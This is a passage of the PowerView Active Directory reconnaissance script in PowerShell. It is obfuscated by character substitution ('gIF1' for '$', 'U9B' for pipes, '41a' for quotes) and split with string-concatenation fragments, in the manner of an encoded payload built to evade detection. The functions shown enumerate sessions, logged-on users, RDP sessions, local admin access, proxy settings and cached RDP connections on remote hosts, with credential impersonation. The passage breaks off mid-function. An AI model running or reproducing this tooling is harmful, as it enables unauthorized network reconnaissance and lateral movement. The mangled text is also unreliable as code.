                gIF1Increment = gIF1SESSION_INFO_10::GetSize()

                # parse all the result structures
                for (gIF1i = 0; (gIF1i -lt gIF1EntriesRead); gIF1i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                    gIF1Info = gIF1NewIntPtr -as gIF1SESSION_INFO_10

                    # return all the sections of the structure - have to do it this way for V2
                    gIF1Session = gIF1Info U9B Select-Object *
                    gIF1Session U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                    gIF1Session.PSObject.TypeNames.Insert(0, 41aPowerView.SessionInfo41a)
                    gIF1Offset = gIF1NewIntPtr.ToInt64()
                    gIF1Offset += gIF1Increment
                    gIF1Session
                }

                # free up the result buffer
                gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)
            }
            else {
                Write-Verbose Zfr[Get-NetSession] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
            }
        }
    }


    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-RegLoggedOn {
<#
.SYNOPSIS

Returns who is logged onto the local (or a remote) machine
through enumeration of remote registry keys.

Note: This function requires only domain user rights on the
machine you41are enumerating, but remote registry must be enabled.

Author: Matt Kelly (@BreakersAll)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  

.DESCRIPTION

This function will query the HKU registry values to retrieve the local
logged on users SID and then attempt and reverse it.
Adapted technique from Sysinternal41as PSLoggedOn script. Benefit over
using the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges
required (NetWkstaUserEnum requires remote admin access).

.PARAMET'+'E'+'R ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-RegLoggedOn

Returns users actively logged onto the local host.

.EXAMPLE

Get-RegLoggedOn -ComputerName sqlserver

Returns users actively logged onto the 41asqlserver41a host.

.EXAMPLE

Get-DomainController U9B Get-RegLoggedOn

Returns users actively logged on all domain controllers.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-RegLoggedOn -ComputerName sqlserver -Credential gIF1Cred

.OUTPUTS

PowerView.RegLoggedOnUser

A PSCustomObject including the UserDomain/UserName/UserSID of each
actively logged on user, with the ComputerName added.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.RegLoggedOnUser41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            try {
                # retrieve HKU remote registry values
                gIF1Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(41aUsers41a, ZfrgIF1ComputerNameZfr)

                # sort out bogus sid41as like _class
                gIF1Reg.GetSubKeyNames() U9B Where-Object { gIF1_ -match 41aS-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+gIF141a } U9B ForEach-Object {
                    gIF1UserName = ConvertFrom-SID -ObjectSID gIF1_ -OutputType 41aDomainSimple41a

                    if (gIF1UserName) {
                        gIF1UserName, gIF1UserDomain = gIF1UserName.Split(41a@41a)
                    }
                    else {
                        gIF1UserName = gIF1_
                        gIF1UserDomain = gIF1Null
                    }

                    gIF1RegLoggedOnUser = New-Object PSObject
                    gIF1RegLoggedOnUser U9B Add-Member Noteproperty 41aComputerName41a ZfrgIF1ComputerNameZfr
                    gIF1RegLoggedOnUser U9B Add-Member Noteproperty 41aUserDomain41a gIF1UserDomain
                    gIF1RegLoggedOnUser U9B Add-Member Noteproperty 41aUserName41a gIF1UserName
                    gIF1RegLoggedOnUser U9B Add-Member Noteproperty 41aUserSID41a gIF1_
                    gIF1RegLoggedOnUser.PSObject.TypeNames.Insert(0, 41aPowerView.RegLoggedOnUser41a)
                    gIF1RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose Zfr[Get-RegLoggedOn] Error opening remote registry on 41agIF1ComputerName41a : gIF1_Zfr
            }
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
       '+' }
    }
}


function Get-NetRDPSession {
<#
.SYNOPSIS

Returns remote desktop/session information for the local (or a remote) machine.

Note: only members of the Administrators or Account Operators local group
can successfully execute this functionality on a remote target.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the WTSEnumerateSessionsEx and WTSQuerySessionInformation
Win32API calls to query a given RDP remote service for active sessions and originating
IPs. This is a replacement for qwinsta.

.PARAMETER ComputerName

Specifies the hostname to query for active sessions (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetRDPSession

Returns active RDP/terminal sessions on the local host.

.EXAMPLE

Get-NetRDPSession -ComputerName ZfrsqlserverZfr

Returns active RDP/terminal sessions on the 41asqlserver41a host.

.EXAMPLE

Get-DomainController U9B Get-NetRDPSession

Returns active RDP/terminal sessions on all domain controllers.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-NetRDPSession -ComputerName sqlserver -Credential gIF1Cred

.OUTPUTS

PowerView.RDPSessionInfo

A PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,
with the ComputerName added.

.LINK

https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
#>

    [OutputType(41aPowerView.RDPSessionInfo41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {

            # open up a handle to the Remote Desktop Session host
            gIF1Handle = gIF1Wtsapi32::WTSOpenServerEx(gIF1Computer)

            # if we get a non-zero handle back, everything was successful
 '+'           if (gIF1Handle -ne 0) {

                # arguments for WTSEnumerateSessionsEx
                gIF1ppSessionInfo = [IntPtr]::Zero
                gIF1pCount = 0

                # get information on all current sessions
                gIF1Result = gIF1Wtsapi32::WTSEnumerateSessionsEx(gIF1Handle, [ref]1, 0, [ref]gIF1ppSessionInfo, [ref]gIF1pCount);gIF1LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # locate the offset of the initial intPtr
                gIF1Offset = gIF1ppSessionInfo.ToInt64()

                if ((gIF1Result -ne 0) -and (gIF1Offset -gt 0)) {

                    # work out how much to increment the pointer by finding out the size of the structure
                    gIF1Increment = gIF1WTS_SESSION_INFO_1::GetSize()

                    # parse all the result structures
                    for (gIF1i = 0; (gIF1i -lt gIF1pCount); gIF1i++) {

                        # create a new int ptr at the given offset and cast the pointer as our result structure
                       '+' gIF1NewIntPtr = New-Object System.Intptr -ArgumentList gIF1Offset
                        gIF1Info = gIF1NewIntPtr -as gIF1WTS_SESSION_INFO_1

                     '+'   gIF1RDPSession = New-Object PSObject

                        if (gIF1Info.pHostName) {
                            gIF1RDPSession U9B Add-Member Noteproperty 41aComputerName41a gIF1Info.pHostName
                        }
                        else {
                            # if no hostname returned, use the specified hostname
                            gIF1RDPSession U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                        }

                        gIF1RDPSession U9B Add-Member Noteproperty 41aSessionName41a gIF1Info.pSessionName

                        if (gIF1(-not gIF1Info.pDomainName) -or (gIF1Info.pDomainName -eq 41a41a))'+' {
                            # if a domain isn41at returned just use the username
                            gIF1RDPSession U9B Add-Member Noteproperty 41aUserName41a ZfrgIF1(gIF1Info.pUserName)Zfr
                        }
                        else {
                            gIF1RDPSession U9B Add-Member Noteproperty 41aUserName41a ZfrgIF1(gIF1Info.pDomainName)YwWgIF1(gIF1Info.pUserName)Zfr
                        }

                        gIF1RDPSession U9B Add-Member Noteproperty 41aID41a gIF1Info.SessionID
                        gIF1RDPSession U9B Add-Member Noteproperty 41aState41a gIF1Info.State

                        gIF1ppBuffer = [IntPtr]::Zero
                        gIF1pBytesReturned = 0

                        # query for th'+'e source client IP with WTSQuerySessionInformation
                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                        gIF1Result2 = gIF1Wtsapi32::WTSQuerySessionInformation(gIF1Handle, gIF1Info.SessionID, 14, [ref]gIF1ppBuffer, [ref]gIF1pBytesReturned);gIF1LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (gIF1Result2 -eq 0) {
                            Write-Verbose Zfr[Get-NetRDPSession] Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError2).'+'Message)Zfr
                        }
                        else {
                            gIF1Offset2 = gIF1ppBuffer.ToInt64()
                            gIF1NewIntPtr2 = New-Object System.Intptr -ArgumentList gIF1Offset2
                            gIF1Info2 = gIF1NewIntPtr2 -as gIF1WTS_CLIENT_ADDRESS

                            gIF1SourceIP = gIF1Info2.Address
                            if (gIF1SourceIP[2] -ne 0) {
                                gIF1SourceIP = [String]gIF1SourceIP[2]+41a.41a+[String]gIF1SourceIP[3]+41a.41a+[String]gIF1SourceIP[4]+41a.41a+[String]gIF1SourceIP[5]
                            }
                            else {
                                gIF1SourceIP = gIF1Null
                            }

                            gIF1RDPSession U9B Add-Member Noteproperty 41aSourceIP41a gIF1SourceIP
                            gIF1RDPSession.PSObject.TypeNames.Insert(0, 41aPowerView.RDPSessionInfo41a)
                            gIF1RDPSession

                            # free up the memory buffer
                            gIF1Null = gIF1Wtsapi32::WTSFreeMemory(gIF1ppBuffer)

                            gIF1Offset += gIF1Increment
                        }
                    }
                    # free up the memory result bu'+'ffer
                    gIF1Null = gIF1Wtsapi32::WTSFreeMemoryEx(2, gIF1ppSessionInfo, gIF1pCount)
                }
                else {
                    Write-Verbose Zfr[Get-NetRDPSession] Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
                }
                # close off the service handle
                gIF1Null = gIF1Wtsapi32::WTSCloseServer(gIF1Handle)
            }
            else {
                Write-Verbose Zfr[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: gIF1ComputerNameZfr
            }
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Test-AdminAccess {
<#
.SYNOPSIS

Tests if the current user has administrative access to the local (or a remote) machine.

Idea stolen from the local_admin_search_enum post module in Metasploit written by:  
    41aBrandon McCann ZfrzeknoxZfr <bmccann[at]accuvant.com>41a  
    41aThomas McCarthy ZfrsmilingraccoonZfr <smilingraccoon[at]gmail.com>41a  
    41aRoyce Davis Zfrr3dyZfr <rdavis[at]accuvant.com>41a  

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, '+'Invoke-RevertToSelf  

.DESCRIPTION

This function will use the OpenSCManagerW Win32API call to establish
a handle to the remote host. If this succeeds, the current user context
has local administrator acess to the target.

.PARAMETER ComputerName

Specifies the hostname to check for local admin access (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Test-AdminAccess -ComputerName sqlserver

Returns results indicating whether the current user has admin access to the 41asqlserver41a host.

.EXAMPLE

Get-DomainComputer U9B Test-AdminAccess

Returns what machines in the domain the current user has access to.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Test-AdminAccess -ComputerName sqlserver -Credential gIF1Cred

.OUTPUTS

PowerView.AdminAccess

A PSCustomObject containing the ComputerName and 41aIsAdmin41a set to whether
the curre'+'nt user has local admin rights, along with the ComputerName added.

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(41aPowerView.AdminAccess41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # 0xF003F - SC_MANAGER_ALL_ACCESS
            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
            gIF1Handle = gIF1Advapi32::OpenSCManagerW(ZfrYwWYwWgIF1ComputerZfr, 41aServicesActive41a, 0xF003F);gIF1LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            gIF1IsAdmin = New-Object PSObject
            gIF1IsAdmin U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer

            # if we get a non-zero handle back, everything was successful
            if (gIF1Handle -ne 0) {
                gIF1Null = gIF1Advapi32::CloseServiceHandle(gIF1Handle)
                gIF1IsAdmin U9B Add-Member Noteproperty 41aIsAdmin41a gIF1True
            }
            else {
                Write-Verbose Zfr[Test-AdminAccess] Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
                gIF1IsAdmin U9B Add-Member Noteproperty 41aIsAdmin41a gIF1False
            }
            gIF1IsAdmin.PSObject.TypeNames.Insert(0, 41aPowerView.AdminAccess41a)
            gIF1IsAdmin
        }
    }

    END {
        if (gIF1LogonToken) {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
}


function Get-NetComputerSiteName {
<#
.SYNOPSIS

Returns the AD site where the local (or a remote) machine resides.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the DsGetSiteName Win32API call to look up the
name of the site where a specified computer resides.

.PARAMETER ComputerName

Specifies the hostname to check the site for (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local

Returns the site for WINDOWS1.testlab.local.

.EXAMPLE

Get-DomainComputer U9B Get-NetComputerSiteName

Returns the sites for every machine in AD.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential gIF1Cred

.OUTPUTS

PowerView.ComputerSite

A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
#>

    [OutputType(41aPowerView.ComputerSite41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # if we get an IP address, try to resolve the IP to a hostname
            if (gIF1Computer -match 41a^(?:[0-9]{1,3}YwW.){3}[0-9]{1,3}gIF141a) {
                gIF1IPAddress = gIF1Computer
                gIF1Computer = [System.Net.Dns]::GetHostByAddress(gIF1Computer) U9B Select-Object -ExpandProperty HostName
            }
            else {
                gIF1I'+'PAddress = @(Resolve-IPAddress -ComputerName gIF1Computer)[0].IPAddress
            }

            gIF1PtrInfo = [IntPtr]::Zero

            gIF1Result = gIF1Netapi32::DsGetSiteName(gIF1Computer, [ref]gIF1PtrInfo)

            gIF1ComputerSite = New-Object PSObject
            gIF1ComputerSite U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
            gIF1ComputerSite U9B Add-Member Noteproperty 41aIPAddress41a gIF1IPAddress

            if (gIF1Result -eq 0) {
                gIF1Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(gIF1PtrInfo)
                gIF1ComputerSite U9B Add-Member Noteproperty 41aSiteName41a gIF1Sitename
            }
            else {
                Write-Verbose Zfr[Get-NetComputerSiteName] Error: gIF1(([ComponentModel.Win32Exception] gIF1Result).Message)Zfr
                gIF1ComputerSite U9B Add-Member Noteproperty 41aSiteName41a 41a41a
            }
            gIF1ComputerSite.PSObject.TypeNames.Insert(0, 41aPowerView.ComputerSite41a)

            # free up the result buffer
            gIF1Null = gIF1Netapi32::NetApiBufferFree(gIF1PtrInfo)

            gIF1ComputerSite
        }
    }

    END {
        if (gIF1LogonToken'+') {
            Invoke-RevertToSelf -TokenHandle gIF1LogonToken
        }
    }
'+'
}


function Get-WMIRegProxy {
<#
.SYNOPSIS

Enumerates the proxy server and WPAD conents for the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates the proxy server and '+'WPAD specification for the current user
on the local machine (default), or a machine specifi'+'ed with -ComputerName.
It does this by enumerating settings from
HKU:SOFTWAREYwWMicrosoftYwWWindowsYwWCurrentVersionYwWInternet Settings.

.PARAMETER ComputerName

Specifies the system to enumerate proxy settings on. Defaults to the local host.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegPro'+'xy

ComputerName           ProxyServer            AutoConfigURL         Wpad
------------           -----------            -------------         ----
WINDOWS1               http://primary.test...

.EXAMPLE

gIF1Cred = Get-Credential ZfrTESTLABYwWadministratorZfr
Get-WMIRegProxy -Credential gIF1Cred -ComputerName primary.testlab.local

ComputerName            ProxyServer            AutoConfigURL         Wpad
------------            -----------            -------------         ----
windows1.testlab.'+'local  primary.testlab.local

.INPUTS

String

Accepts one or more computer name specification strings  on the pipeline (netbios or FQDN).

.OUTPUTS

PowerView.ProxySettings

Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.
#>

    [OutputType(41aPowerView.ProxySettings41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = gIF1Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            try {
                gIF1WmiArguments = @{
                    41aList41a = gIF1True
                    41aClass41a = 41aStdRegProv41a
                    41aNamespace41a = 41arootYwWdefault41a
                    41aComputername41a = gIF1Computer
                    41aErrorAction41a = 41aStop41a
                }
                if (gIF1PSBoundParameters[41aCredential41a]) { gIF1WmiArguments[41aCredential41a] = gIF1Credential }

                gIF1RegProvider = Get-WmiObject @WmiArguments
                gIF1Key = 41aSOFTWAREYwWMicrosoftYwWWindowsYwWCurrentVersionYwWInternet Settings41a

                # HKEY_CURRENT_USER
                gIF1HKCU = 2147483649
                gIF1ProxySe'+'rver = gIF1RegProvider.GetStringValue(gIF1HKCU, gIF1Key, 41aProxyServer41a).sValue
                gIF1AutoConfigURL = gIF1RegProvider.GetStringValue(gIF1HKCU, gIF1Key, 41aAutoConfigURL41a).sValue

                gIF1Wpad = 41a41a
                if (gIF1AutoConfigURL -and (gIF1AutoConfigURL -ne 41a41a)) {
                    try {
                        gIF1Wpad = (New-Object Net.WebClient).DownloadString(gIF1AutoConfigURL)
                    }
                    catch {
                        Write-Warning Zfr[Get-WMIRegProxy] Error connecting to AutoConfigURL : gIF1AutoConfigURLZfr
                    }
                }

                if (gIF1ProxyServer -or gIF1AutoConfigUrl) {
                    gIF1Out = New-Object PSObject
                    gIF1Out U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                    gIF1Out U9B Add-Member Noteproperty 41aProxyServer41a gIF1ProxyServer
                    gIF1Out U9B Add-Member Noteproperty 41aAutoConfigURL41a gIF1AutoConfigURL
                    gIF1Out U9B Add-Member Noteproperty 41aWpad41a gIF1Wpad
                    gIF1Out.PSObject.TypeNames.Insert(0, 41aPowerView.ProxySettings41a)
                    gIF1Out
                }
                else {
                    Write-Warning Zfr[Get-WMIRegProxy] No proxy settings found for gIF1ComputerNameZfr
                }
            }
            catch {
                Write-Warning Zfr[Get-WMIRegProxy] Error enumerating proxy settings for gIF1ComputerName : gIF1_Zfr
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
<#
.SYNOPSIS

Returns the last user who logged onto the local (or a remote) machine.

Note: This function requires administrative rights on the machine you41are enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses remote registry to enumerate the LastLoggedOnUser registry key
for the local (or remote) machine.

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to '+'41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegLastLoggedOn

Returns the last user logged onto the local machine.

.EXAMPLE

Get-WMIRegLastLoggedOn -ComputerName WINDOWS1

Returns the last user logged onto WINDOWS1

.EXAMPLE

Get-DomainComputer U9B Get-WMIRegLastLoggedOn

Returns the last user logged onto all machines in the domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredentia'+'l(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential gIF1Cred

.OUTPUTS

PowerView.LastLoggedOnUser

A PSCustomObject containing the ComputerName and last loggedon user.
#>

    [OutputType(41aPowerView.LastLoggedOnUser41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # HKEY_LOCAL_MACHINE
            gIF1HKLM = 2147483650

            gIF1WmiArguments = @{
                41aList41a = gIF1True
                41aClass41a = 41aStdRegProv41a
                41aNamespace41a = 41arootYwWdefault41a
                41aComputername41a = gIF1Computer
                41aErrorAction41a = 41aSilentlyContinue41a
            }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1WmiArguments[41aCredential41a] = gIF1Credential }

            # try to open up the remote registry key to grab the last logged on user
            try {
                gIF1Reg = Get-WmiObject @WmiArguments

                gIF1Key = 41aSOFTWAREYwWMicrosoftYwWWindowsYwWCurrentVersionYwWAuthenticationYwWLogonUI41a
                gIF1Value = 41aLastLoggedOnUser41a
                gIF1LastUser = gIF1Reg.GetStringValue(gIF1HKLM, gIF1Key, gIF1Value).sValue

                gIF1LastLoggedOn = New-Object PSObject
                gIF1LastLoggedOn U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                gIF1LastLoggedOn U9B Add-Member Noteproperty 41aLastLoggedOn41a gIF1LastUser
                gIF1LastLoggedOn.PSObject.TypeNames.Insert(0, 41aPowerView.LastLoggedOnUser41a)
                gIF1LastLoggedOn
            }
            catch {
                Write-Warning Zfr[Get-WMIRegLastLoggedOn] Error opening remote registry on gIF1Computer. Remote registry likely not enabled.Zfr
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
<#
.SYNOPSIS

Returns information about RDP connections outgoing from the local (or remote) machine.

Note: This function requires administrative rights on the machine you41are enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to query all entries for the
ZfrWindows Remote Desktop Connection ClientZfr on a machine, separated by
user and target server.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 41alocalhost41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegCachedRDPConnectio'+'n

Returns the RDP connection client information for the local machine.

.EXAMPLE

Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local

Returns the RDP connection client information for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer U9B Get-WMIRegCachedRDPConnection

Returns cached RDP information for all machines in the domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPa'+'ssword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential gIF1Cred

.OUTPUTS

PowerView.CachedRDPConnection

A PSCustomObject containing the Compute'+'rName and cached RDP information.
#>

    [OutputType(41aPowerView.CachedRDPConnection41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName = 41alocalhost41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (gIF1Computer in gIF1ComputerName) {
            # HKEY_USERS
            gIF1HKU = 2147483651

            gIF1WmiArguments = @{
                41aList41a = gIF1True
                41aClass41a = 41aStdRegProv41a
                41aNamespace41a = 41arootYwWdefault41a
                41aComputername41a = gIF1Computer
                41aErrorAction41a = 41aStop41a
            }
            if (gIF1PSBoundParameters[41aCredential41a]) { gIF1WmiArguments[41aCredential41a] = gIF1Credential }

            try {
                gIF1Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                gIF1UserSIDs = (gIF1Reg.EnumKey(gIF1HKU, 41a41a)).sNames U9B Where-Object { gIF1_ -match 41aS-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+gIF141a }

                ForEach (gIF1UserSID in gIF1UserSIDs) {
                    try {
                        if (gIF1PSBoundParameters[41aCredential41a]) {
                            gIF1UserName = ConvertFrom-SID -ObjectSid gIF1UserSID -Credential gIF1Credential
                        }
                        else {
                            gIF1UserName = ConvertFrom-SID -ObjectSid gIF1UserSID
                        }

                        # pull out all the cached RDP connections
                        gIF1ConnectionKeys = gIF1Reg.EnumValues(gIF1HKU,ZfrgIF1UserSIDYwWSoftwareYwWMicrosoftYwWTerminal Server ClientYwWDefaultZfr).sNames

                        ForEach (gIF1Connection in gIF1ConnectionKeys) {
                            # make sure this key is a cached connection
                            if (gIF1Connection -match 41aMRU.*41a) {
                                gIF1TargetServer = gIF1Reg.GetStringValue(gIF1HKU, ZfrgIF1UserSIDYwWSoftwareYwWMicrosoftYwWTerminal Server ClientYwWDefaultZfr, gIF1Connection).sValue

         '+'                       gIF1FoundConnection = New-Object PSObject
                                gIF1FoundConnection U9B Add-Member Noteproperty 41aComputerName41a gIF1Computer
                                gIF1FoundConnection U9B Add-Member Noteproperty 41aUserName41a gIF1UserName
                                gIF1FoundConnection U9B Add-Member Noteproperty 41aUserSID41a gIF1UserSID
                                gIF1FoundConnection U9B Add-Member Noteproperty 41aTargetServer41a gIF1TargetServer
                                gIF1FoundConnection U9B Add-Member Noteproperty 41aUsernameHint41a gIF1Null
